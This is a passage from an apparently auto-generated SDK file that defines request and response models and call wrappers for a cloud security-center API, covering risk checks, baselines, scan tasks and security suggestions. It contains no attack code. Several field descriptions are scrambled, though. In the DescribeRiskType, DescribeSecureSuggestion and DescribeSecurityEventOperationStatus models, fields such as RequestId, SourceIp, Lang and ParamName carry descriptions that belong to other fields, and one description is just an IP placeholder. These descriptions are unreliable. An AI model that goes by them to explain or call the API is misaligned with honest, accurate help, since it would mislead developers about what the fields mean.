      title?: string(name='Title', description='The name of the check item.', example='RDS - Whitelist Configuration'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   Identity authentication and permissions
*   Network access control
*   Log audit
*   Data security
*   Monitoring and alerting
*   Basic security protection', example='Log audit'),
    }
  ](name='List', description='An array that consists of the check items.'),
  pageCount?: int32(name='PageCount', description='The total number of pages returned.', example='20'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AD271C07-4ACE-413D-AA9B-F14FD3B7717F'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='12'),
}

model DescribeRiskCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckResultResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckResult operation.
  *
  * @param request DescribeRiskCheckResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckResultResponse
 */
// Deprecated
async function describeRiskCheckResultWithOptions(request: DescribeRiskCheckResultRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.itemIds)) {
    query['ItemIds'] = request.itemIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.queryFlag)) {
    query['QueryFlag'] = request.queryFlag;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckResult operation.
  *
  * @param request DescribeRiskCheckResultRequest
  * @return DescribeRiskCheckResultResponse
 */
// Deprecated
async function describeRiskCheckResult(request: DescribeRiskCheckResultRequest): DescribeRiskCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckResultWithOptions(request, runtime);
}

model DescribeRiskCheckSummaryRequest {
  lang?: string(name='Lang', example='zh'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', example='1232428423234****'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', example='1.2.XX.XX'),
}

model DescribeRiskCheckSummaryResponseBody = {
  requestId?: string(name='RequestId', example='291B49F9-1685-4005-9D34-606B6F78740F'),
  riskCheckSummary?: {
    affectedAssetCount?: int32(name='AffectedAssetCount', example='0'),
    disabledRiskCount?: int32(name='DisabledRiskCount', example='0'),
    enabledRiskCount?: int32(name='EnabledRiskCount', example='3'),
    groups?: [ 
      {
        countByStatus?: [ 
          {
            count?: int32(name='Count', example='2'),
            status?: string(name='Status', example='pass'),
          }
        ](name='CountByStatus'),
        id?: long(name='Id', example='1'),
        remainingTime?: int32(name='RemainingTime', example='0'),
        sort?: int32(name='Sort', example='1'),
        status?: string(name='Status', example='finish'),
        title?: string(name='Title'),
      }
    ](name='Groups'),
    itemCount?: int32(name='ItemCount', example='4'),
    previousCount?: int32(name='PreviousCount', example='0'),
    previousTime?: long(name='PreviousTime', example='1545012926000'),
    riskCount?: int32(name='RiskCount', example='1'),
    riskLevelCount?: [ 
      {
        count?: int32(name='Count', example='1'),
        key?: string(name='Key', example='medium'),
      }
    ](name='RiskLevelCount'),
    riskRate?: float(name='RiskRate', example='0.25'),
  }(name='RiskCheckSummary'),
}

model DescribeRiskCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckSummaryResponseBody(name='body'),
}

/**
  * @deprecated
  * The number of detected risk items.
  *
  * @param request DescribeRiskCheckSummaryRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckSummaryResponse
 */
// Deprecated
async function describeRiskCheckSummaryWithOptions(request: DescribeRiskCheckSummaryRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * The number of detected risk items.
  *
  * @param request DescribeRiskCheckSummaryRequest
  * @return DescribeRiskCheckSummaryResponse
 */
// Deprecated
async function describeRiskCheckSummary(request: DescribeRiskCheckSummaryRequest): DescribeRiskCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckSummaryWithOptions(request, runtime);
}

model DescribeRiskItemTypeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='183.237.XX.XX'),
}

model DescribeRiskItemTypeResponseBody = {
  list?: [ 
    {
      id?: long(name='Id', description='The ID of the check item.', example='37625'),
      title?: string(name='Title', description='The name of the check type.', example='Identity authentication and permissions'),
    }
  ](name='List', description='An array that consists of information about the type of the check item.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
}

model DescribeRiskItemTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskItemTypeResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckStandard operation instead.
  *
  * @param request DescribeRiskItemTypeRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskItemTypeResponse
 */
// Deprecated
async function describeRiskItemTypeWithOptions(request: DescribeRiskItemTypeRequest, runtime: Util.RuntimeOptions): DescribeRiskItemTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskItemType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckStandard operation instead.
  *
  * @param request DescribeRiskItemTypeRequest
  * @return DescribeRiskItemTypeResponse
 */
// Deprecated
async function describeRiskItemType(request: DescribeRiskItemTypeRequest): DescribeRiskItemTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskItemTypeWithOptions(request, runtime);
}

model DescribeRiskListCheckResultRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  instanceIds?: [ string ](name='InstanceIds'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='10'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', example='59.57.XX.XX'),
}

model DescribeRiskListCheckResultResponseBody = {
  list?: [ 
    {
      instanceId?: string(name='InstanceId', example='rm-bp1e8t4q15sr3****'),
      riskCount?: long(name='riskCount', example='3'),
    }
  ](name='List'),
  requestId?: string(name='RequestId', example='3BFB4989-A108-46A4-954E-FF7EF02D1078'),
}

model DescribeRiskListCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskListCheckResultResponseBody(name='body'),
}

/**
  * @deprecated
  * The instance IDs of the cloud services that you want to query. Separate multiple IDs with commas (,).
  * > If you do not specify this parameter, an empty list is returned.
  *
  * @param request DescribeRiskListCheckResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskListCheckResultResponse
 */
// Deprecated
async function describeRiskListCheckResultWithOptions(request: DescribeRiskListCheckResultRequest, runtime: Util.RuntimeOptions): DescribeRiskListCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskListCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * The instance IDs of the cloud services that you want to query. Separate multiple IDs with commas (,).
  * > If you do not specify this parameter, an empty list is returned.
  *
  * @param request DescribeRiskListCheckResultRequest
  * @return DescribeRiskListCheckResultResponse
 */
// Deprecated
async function describeRiskListCheckResult(request: DescribeRiskListCheckResultRequest): DescribeRiskListCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskListCheckResultWithOptions(request, runtime);
}

model DescribeRiskTypeRequest {
  lang?: string(name='Lang', description='The name of the baseline type.', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.X.X'),
}

model DescribeRiskTypeResponseBody = {
  requestId?: string(name='RequestId', description='The description of the rule for the baseline.', example='F22037B5-FCE4-5178-A9E7-71798E1F9270'),
  riskTypes?: [ 
    {
      alias?: string(name='Alias', description='The description of the parameter.', example='Redis unauthorized access high exploit vulnerability risk'),
      subTypes?: [ 
        {
          alias?: string(name='Alias', description='The configuration type of the parameter. Valid values:

*   **1**: input
*   **2**: selection', example='Redis unauthorized access high exploit vulnerability risk'),
          checkDetails?: [ 
            {
              checkDesc?: string(name='CheckDesc', description='The alias of the baseline subtype.', example='Set password expiration time, force regular modification of password, reduce password leakage and guess risk.Use non-password login (e.g. key pair) please ignore this item.'),
              checkId?: long(name='CheckId', description='The ID of the baseline.', example='1299'),
              checkItem?: string(name='CheckItem', description='The name of the baseline subtype.', example='Ensure password expiration period is set.'),
              rules?: [ 
                {
                  optional?: int32(name='Optional', description='The name of the parameter.', example='1'),
                  paramList?: [ 
                    {
                      enumValue?: string(name='EnumValue', example='0,1,2,3'),
                      maxValue?: int32(name='MaxValue', example='999'),
                      minValue?: int32(name='MinValue', example='1'),
                      paramDefaultValue?: string(name='ParamDefaultValue', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7'),
                      paramDesc?: string(name='ParamDesc', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
                      paramName?: string(name='ParamName', description='Queries baseline types.', example='range_val'),
                      paramType?: int32(name='ParamType', example='1'),
                    }
                  ](name='ParamList', description='The description of the baseline.'),
                  ruleDesc?: string(name='RuleDesc', description='An array that consists of the information about baseline subtypes.', example='Please customize the password expiration time detection standard as'),
                  ruleId?: string(name='RuleId', description='The maximum value of the parameter.', example='audit.audit_policy.auditpolicychange.cus'),
                }
              ](name='Rules', description='The minimum value of the parameter.'),
            }
          ](name='CheckDetails', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English'),
          typeName?: string(name='TypeName', description='An array that consists of the check details about the baseline subtype.', example='hc_exploit_redis'),
        }
      ](name='SubTypes', description='An array that consists of the rule details about the baseline.'),
      typeName?: string(name='TypeName', description='The alias of the baseline type.', example='hc_exploit'),
    }
  ](name='RiskTypes', description='An array that consists of the information about baseline types.'),
}

model DescribeRiskTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskTypeResponseBody(name='body'),
}

async function describeRiskTypeWithOptions(request: DescribeRiskTypeRequest, runtime: Util.RuntimeOptions): DescribeRiskTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRiskType(request: DescribeRiskTypeRequest): DescribeRiskTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskTypeWithOptions(request, runtime);
}

model DescribeRisksRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  limit?: int32(name='Limit', description='The maximum number of entries to return. Default value: 20.', example='10'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of baselines.', example='75'),
  riskName?: string(name='RiskName', description='The name of the baseline.', example='docker'),
}

model DescribeRisksResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EA54FE21-B006-5DFF-8D64-C4FFECDA****'),
  risks?: [ 
    {
      riskDetail?: string(name='RiskDetail', description='The description of the baseline.', example='Ubuntu 14,Ubuntu 16 ,Ubuntu 18,Ubuntu 20 baseline based on Alibaba Cloud best security practices'),
      riskId?: long(name='RiskId', description='The ID of the baseline.', example='54'),
      riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Standard - Ubuntu Security Baseline'),
      riskType?: string(name='RiskType', description='The name of the baseline type.', example='cis'),
      subRiskType?: string(name='SubRiskType', description='The name of the baseline subtype.', example='hc_ubuntu'),
      subTypeAlias?: string(name='SubTypeAlias', description='The display name of the baseline subtype.', example='Alibaba Cloud Standard - Ubuntu Security Baseline'),
      typeAlias?: string(name='TypeAlias', description='The display name of the baseline type.', example='Best security practices'),
    }
  ](name='Risks', description='An array that consists of baselines.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
}

model DescribeRisksResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRisksResponseBody(name='body'),
}

async function describeRisksWithOptions(request: DescribeRisksRequest, runtime: Util.RuntimeOptions): DescribeRisksResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.limit)) {
    query['Limit'] = request.limit;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRisks',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRisks(request: DescribeRisksRequest): DescribeRisksResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRisksWithOptions(request, runtime);
}

model DescribeSasPmAgentListRequest {
  lang?: string(name='Lang', example='en'),
  uuids?: string(name='Uuids', example='inet-cb7ae5ee-b2bc-4581-b616-62495f5d****,inet-37cf0e4f-55cc-4b84-8073-b348b4b4****'),
}

model DescribeSasPmAgentListResponseBody = {
  requestId?: string(name='RequestId', example='8EF3ACC2-9400-5B64-B72D-4A1D35113750'),
  sasPmAgentList?: [ 
    {
      aliyunAssistId?: string(name='AliyunAssistId', example='mi-hz034jn***yxhc0'),
      aliyunMonitorId?: string(name='AliyunMonitorId', example='5d5ef6be-54ff-11ed-82cf-8f01475e****'),
      assistInstallResult?: int32(name='AssistInstallResult', example='0'),
      assistInstallStatus?: int32(name='AssistInstallStatus', example='1'),
      monitorInstallResult?: int32(name='MonitorInstallResult', example='1'),
      monitorInstallStatus?: int32(name='MonitorInstallStatus', example='1'),
      uuid?: string(name='Uuid', example='87f1724d-075e-48d3-95fd-78c2dd36****'),
    }
  ](name='SasPmAgentList'),
}

model DescribeSasPmAgentListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSasPmAgentListResponseBody(name='body'),
}

async function describeSasPmAgentListWithOptions(request: DescribeSasPmAgentListRequest, runtime: Util.RuntimeOptions): DescribeSasPmAgentListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSasPmAgentList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSasPmAgentList(request: DescribeSasPmAgentListRequest): DescribeSasPmAgentListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSasPmAgentListWithOptions(request, runtime);
}

model DescribeScanTaskProgressRequest {
  taskId?: long(name='TaskId', example='282832'),
}

model DescribeScanTaskProgressResponseBody = {
  requestId?: string(name='RequestId', example='EA15BA8A-D631-4375-8D40-CB7C769B0279'),
  scanTaskProgress?: string(name='ScanTaskProgress', example='Success'),
  targetInfo?: string(name='TargetInfo', example='[{"type":"uuid","name":"host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
}

model DescribeScanTaskProgressResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeScanTaskProgressResponseBody(name='body'),
}

async function describeScanTaskProgressWithOptions(request: DescribeScanTaskProgressRequest, runtime: Util.RuntimeOptions): DescribeScanTaskProgressResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScanTaskProgress',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeScanTaskProgress(request: DescribeScanTaskProgressRequest): DescribeScanTaskProgressResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScanTaskProgressWithOptions(request, runtime);
}

model DescribeScanTaskStatisticsRequest {
  levels?: string(name='Levels', example='serious,suspicious,remind'),
}

model DescribeScanTaskStatisticsResponseBody = {
  dealedRiskNum?: int32(name='DealedRiskNum', example='11'),
  personalTaskNum?: long(name='PersonalTaskNum', example='11'),
  requestId?: string(name='RequestId', example='765EDBDE-1686-5DBA-B76F-2E0XXXXXXX'),
  totalTaskNum?: long(name='TotalTaskNum', example='11'),
  userNum?: long(name='UserNum', example='11'),
}

model DescribeScanTaskStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeScanTaskStatisticsResponseBody(name='body'),
}

async function describeScanTaskStatisticsWithOptions(request: DescribeScanTaskStatisticsRequest, runtime: Util.RuntimeOptions): DescribeScanTaskStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScanTaskStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeScanTaskStatistics(request: DescribeScanTaskStatisticsRequest): DescribeScanTaskStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScanTaskStatisticsWithOptions(request, runtime);
}

model DescribeSearchConditionRequest {
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='117.220.XX.XX'),
  type?: string(name='Type', example='ecs'),
}

model DescribeSearchConditionResponseBody = {
  conditionList?: [ 
    {
      conditionType?: string(name='ConditionType', example='system'),
      filterConditions?: string(name='FilterConditions', example='{\\"filterParams\\":[{\\"labelKey\\":\\"a|b\\",\\"value\\":\\"{\\\\\\"name\\\\\\":\\\\\\"sadsasd\\\\\\",\\\\\\"value\\\\\\":\\\\\\"dasdsdas\\\\\\"}\\"}],\\"LogicalExp\\":\\"OR\\"}'),
      name?: string(name='Name', example='StopMachine'),
      nameKey?: string(name='NameKey', example='stop_machine'),
    }
  ](name='ConditionList'),
  requestId?: string(name='RequestId', example='3AEC47AF-8CFA-485E-AC9A-3A8ABC06EA7F'),
}

model DescribeSearchConditionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSearchConditionResponseBody(name='body'),
}

async function describeSearchConditionWithOptions(request: DescribeSearchConditionRequest, runtime: Util.RuntimeOptions): DescribeSearchConditionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSearchCondition',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSearchCondition(request: DescribeSearchConditionRequest): DescribeSearchConditionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSearchConditionWithOptions(request, runtime);
}

model DescribeSecureSuggestionRequest {
  lang?: string(name='Lang', description='The ID of the request, which is used to locate and troubleshoot issues.', example='zh'),
  sourceIp?: string(name='SourceIp', description='An array that consists of the unhandled security risks.', example='192.168.XX.XX'),
}

model DescribeSecureSuggestionResponseBody = {
  requestId?: string(name='RequestId', description='192.168.XX.XX', example='676F80E3-4B3F-43DA-9CBB-5FF79F202AA2'),
  suggestions?: [ 
    {
      detail?: [ 
        {
          description?: string(name='Description', example='Malicious tampering of Web pages will affect your normal access to web page content, and may also lead to serious economic losses, brand losses, and even political risks. The webpage tamper-proof service can monitor the website directory in real time and restore the tampered files or directories through backup, so as to ensure that the website information of important systems is not tampered with maliciously and prevent the occurrence of horse hanging, black chain, illegal implantation of terrorist threats, pornography and other content.'),
          subType?: string(name='SubType', example='REINFORCE_WEB_LOCK'),
          title?: string(name='Title', example='Website tamper-proofing capability not configured'),
        }
      ](name='Detail'),
      points?: int32(name='Points', description='DescribeSecureSuggestion', example='40'),
      suggestType?: string(name='SuggestType', example='SS_ALARM'),
    }
  ](name='Suggestions', description='Queries suggestions on how to handle the security risks that affect the security score.'),
  totalCount?: int32(name='TotalCount', description='The source IP address of the request.', example='15'),
}

model DescribeSecureSuggestionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecureSuggestionResponseBody(name='body'),
}

async function describeSecureSuggestionWithOptions(request: DescribeSecureSuggestionRequest, runtime: Util.RuntimeOptions): DescribeSecureSuggestionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecureSuggestion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecureSuggestion(request: DescribeSecureSuggestionRequest): DescribeSecureSuggestionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecureSuggestionWithOptions(request, runtime);
}

model DescribeSecurityCheckScheduleConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeSecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
  riskCheckJobConfig?: {
    daysOfWeek?: string(name='DaysOfWeek', description='The day of the week when the check tasks are performed. Multiple days can be specified. Multiple days are separated by commas (,).

*   **1**: Monday
*   **2**: Tuesday
*   **3**: Wednesday
*   **4**: Thursday
*   **5**: Friday
*   **6**: Saturday
*   **7**: Sunday', example='1,2,3'),
    endTime?: int32(name='EndTime', description='The time range during which check tasks end. Valid values:

*   **6**: 00:00 to 06:00
*   **12**: 06:00 to 12:00
*   **18**: 12:00 to 18:00
*   **24**: 18:00 to 24:00', example='12'),
    startTime?: int32(name='StartTime', description='The time range during which check tasks start. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='6'),
  }(name='RiskCheckJobConfig', description='The configurations of custom check tasks.'),
}

model DescribeSecurityCheckScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the GetCheckConfig operation.
  *
  * @param request DescribeSecurityCheckScheduleConfigRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeSecurityCheckScheduleConfigResponse
 */
// Deprecated
async function describeSecurityCheckScheduleConfigWithOptions(request: DescribeSecurityCheckScheduleConfigRequest, runtime: Util.RuntimeOptions): DescribeSecurityCheckScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityCheckScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * This operation is phased out. You can use the GetCheckConfig operation.
  *
  * @param request DescribeSecurityCheckScheduleConfigRequest
  * @return DescribeSecurityCheckScheduleConfigResponse
 */
// Deprecated
async function describeSecurityCheckScheduleConfig(request: DescribeSecurityCheckScheduleConfigRequest): DescribeSecurityCheckScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityCheckScheduleConfigWithOptions(request, runtime);
}

model DescribeSecurityEventOperationStatusRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventIds?: [ string ](name='SecurityEventIds', description='The code that indicates the handling result of the alert event.', example='["909361"]'),
  sourceIp?: string(name='SourceIp', description='An array consisting of the status of the alert events handled by the task.', example='192.168.XX.XX'),
